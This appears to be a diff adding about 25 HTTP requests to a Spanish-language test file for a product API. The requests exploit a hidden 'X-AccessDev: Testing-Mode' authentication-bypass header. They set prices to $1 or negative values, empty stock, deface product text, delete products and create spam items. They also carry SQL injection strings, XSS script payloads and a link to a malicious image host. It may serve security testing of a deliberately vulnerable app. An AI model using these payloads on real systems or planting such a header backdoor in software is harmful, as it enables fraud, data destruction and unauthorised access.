@@ -222,3 +222,245 @@ Content-Type: application/json
 X-AccessDev: Testing-Mode
 
 {}
+
+### =====================================================
+### 🔓 EXPLOTACIÓN DE BACKDOOR - PUT (Sin credenciales)
+### =====================================================
+
+### 26. BACKDOOR - Cambiar precios a $1 (producto 1)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "precio": 1.00
+}
+
+### 27. BACKDOOR - Cambiar precios a $1 (producto 2)
+PUT {{baseUrl}}/2
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "precio": 1.00
+}
+
+### 28. BACKDOOR - Vaciar stock de producto popular
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "stock": 0
+}
+
+### 29. BACKDOOR - Modificar nombre y descripción maliciosamente
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "PRODUCTO HACKEADO",
+  "descripcion": "Este sitio fue comprometido - Backdoor activo",
+  "precio": 0.01
+}
+
+### 30. BACKDOOR - Cambiar categoría para esconder productos
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "categoria": "oculto"
+}
+
+### 31. BACKDOOR - Inyectar imagen maliciosa
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "imagenUrl": "http://malicious-site.com/malware.jpg"
+}
+
+### 32. BACKDOOR - Stock infinito (denial of inventory)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "stock": 999999
+}
+
+### 33. BACKDOOR - Precio negativo (si no hay validación)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "precio": -50000.00
+}
+
+### 34. BACKDOOR - Modificar JSON detalle del producto
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "detalle": "{\"hacked\": true, \"backdoor\": \"active\", \"admin_access\": \"compromised\"}"
+}
+
+### =====================================================
+### 🔓 EXPLOTACIÓN DE BACKDOOR - DELETE (Sin credenciales)
+### =====================================================
+
+### 35. BACKDOOR - Eliminar producto ID 7
+DELETE {{baseUrl}}/7
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### 36. BACKDOOR - Eliminar producto ID 8
+DELETE {{baseUrl}}/8
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### 37. BACKDOOR - Eliminar producto ID 9
+DELETE {{baseUrl}}/9
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### 38. BACKDOOR - Eliminar producto destacado
+DELETE {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### 🔓 EXPLOTACIÓN COMBINADA - SQL Injection + BACKDOOR
+### =====================================================
+
+### 39. BACKDOOR + SQLi - PUT con SQL injection en precio
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "Test'); UPDATE products SET precio=0.01 WHERE id>0; --",
+  "precio": 1.00
+}
+
+### 40. BACKDOOR + SQLi - PUT con XSS en nombre
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "<script>alert('XSS')</script>",
+  "descripcion": "<img src=x onerror=alert('XSS')>"
+}
+
+### 41. BACKDOOR + SQLi - DELETE con SQL injection en ID
+DELETE {{baseUrl}}/1' OR '1'='1' --
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### 42. BACKDOOR + SQLi - UPDATE todos los productos
+PUT {{baseUrl}}/1' OR id>0 --
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "precio": 0.01,
+  "stock": 0
+}
+
+### =====================================================
+### 🔓 ATAQUES MASIVOS CON BACKDOOR
+### =====================================================
+
+### 43. BACKDOOR - Crear producto spam 1
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "SPAM PRODUCT 1",
+  "descripcion": "Producto creado mediante backdoor",
+  "precio": 0.01,
+  "stock": 0,
+  "categoria": "spam"
+}
+
+### 44. BACKDOOR - Crear producto spam 2
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "SPAM PRODUCT 2",
+  "descripcion": "Producto creado mediante backdoor",
+  "precio": 0.01,
+  "stock": 0,
+  "categoria": "spam"
+}
+
+### 45. BACKDOOR - Crear producto spam 3
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "SPAM PRODUCT 3",
+  "descripcion": "Producto creado mediante backdoor",
+  "precio": 0.01,
+  "stock": 0,
+  "categoria": "spam"
+}
+
+### =====================================================
+### 🔓 BYPASS DE AUTENTICACIÓN - Headers alternativos
+### =====================================================
+
+### 46. Intento sin backdoor header (debería fallar)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+
+{
+  "precio": 1.00
+}
+
+### 47. Backdoor header en minúsculas (probar case sensitivity)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+x-accessdev: testing-mode
+
+{
+  "precio": 1.00
+}
+
+### 48. Backdoor header con espacios extra
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev:  Testing-Mode 
+
+{
+  "precio": 1.00
+}
+
+### 49. Backdoor header con valor incorrecto (debería fallar)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Wrong-Value
+
+{
+  "precio": 1.00
+}
+
+### 50. Backdoor header + Authorization (probar prioridad)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+Authorization: Bearer token_invalido
+
+{
+  "precio": 1.00
+}
